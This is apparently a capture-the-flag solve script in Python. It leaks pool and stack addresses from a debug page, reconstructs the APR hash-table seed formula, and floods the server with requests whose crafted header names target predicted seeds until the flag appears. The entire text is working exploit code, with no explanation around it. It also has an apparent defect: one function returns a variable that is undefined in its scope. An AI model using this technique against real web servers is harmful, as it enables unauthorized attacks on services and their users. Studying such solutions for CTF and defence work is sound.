from socket import fromfd
import requests
from pwn import *


session = requests.Session()

base_url = "http://127.0.0.1:50000/chall"
#base_url = "http://127.0.0.1:1337/chall" # for local testing
headers = {
    "DEBUG": "1",
    "Accept-Language": "en-US",
    "Accept-Charset": "ascii",
}

def simple_request():
    session.get(base_url, headers=headers)

pool_i = 0
pool_addr = []

stack_values = []
stack_i = 0

for i in range(10):
    r = session.get(base_url, headers=headers).text
    r_addr = r.split("request: ")[1].split(" </p>")[0]
    r_addr = u64(r_addr.ljust(8, "\x00"))
    if not r_addr in pool_addr:
        pool_addr.append(r_addr)

def request():
    global pool_i
    global stack_i
    pool_i += 1
    pool_i = pool_i % len(pool_addr)

    response = session.get(base_url, headers=headers)

    r = response.text
    r_addr = r.split("request: ")[1].split(" </p>")[0]
    r_addr = u64(r_addr.ljust(8, "\x00"))
    if not r_addr in pool_addr:
        pool_addr.append(r_addr)
    r_now = int(r.split("time: ")[1].split(" </p>")[0])
    r_htseed = int(r.split("ht->seed: ")[1].split(" </p>")[0][2:], 16)
    r_htaddr = r_addr + 0x4a0
    r_addr2 = pool_addr[pool_i]
    r_htaddr = r_addr2 + 0x4a0
    tmp_seed = r_htseed + 1
    tmp_seed ^= r_now
    tmp_seed ^= r_addr
    tmp_seed ^= r_now >> 32
    leak = tmp_seed ^ r_htaddr
    leak &= 0xFFFFFFFF
    r_nowaddr = leak
    if (len(stack_values) != 0):
        stack_i += 1
        stack_i = stack_i % len(stack_values)

    return (r_addr, r_now, r_nowaddr, r_htaddr)

def predict_leak(input, offset):
    global pool_i
    global stack_i
    # (unsigned int)((now >> 32) ^ now ^ (apr_uintptr_t)pool ^
    #                              (apr_uintptr_t)ht ^ (apr_uintptr_t)&now) - 1;
    r_addr, r_now, r_nowaddr, r_htaddr = input
    r_now += offset
    r_addr = pool_addr[pool_i % len(pool_addr)]
    r_htaddr = pool_addr[(pool_i + 1) % len(pool_addr)] + 0x4a0
    r_nowaddr = stack_values[(stack_i + 1) % len(stack_values)]
    r_now_high = r_now >> 32
    pred_seed = (r_now_high ^ r_now ^ r_addr ^ r_htaddr ^ r_nowaddr) - 1
    return pred_seed & 0xFFFFFFFF

def try_overwrite(seed):
    global pool_i
    global stack_i
    pool_i += 1
    pool_i = pool_i % len(pool_addr)
    stack_i += 1
    stack_i = stack_i % len(stack_values)
    headers = {
        "DEBUG": "1",
        "Accept-Language": "en-US",
        "Accept-Charset": "ascii",
        f"{hex(seed)}": "6000"
    }
    response = session.get(base_url, headers=headers)
    r = response.text

    if "SSM" in r:
        print("SSM")
        print(r)
        exit(0)

    return r_addr



import random


stack_values = []
stack_i = 0

for i in range(50):
    t = request()
    t2 = t[2] & 0xFFFFFFF0
    if t2 not in stack_values:
        stack_values.append(t2)

# find stack offset

t = request()
for i in range(len(stack_values)):
    if stack_values[i] == t[2]:
        stack_i = i
        break

for i in range(10000):
    t = request()
    tx2 = try_overwrite(predict_leak(t, random.randint(600, 800)))
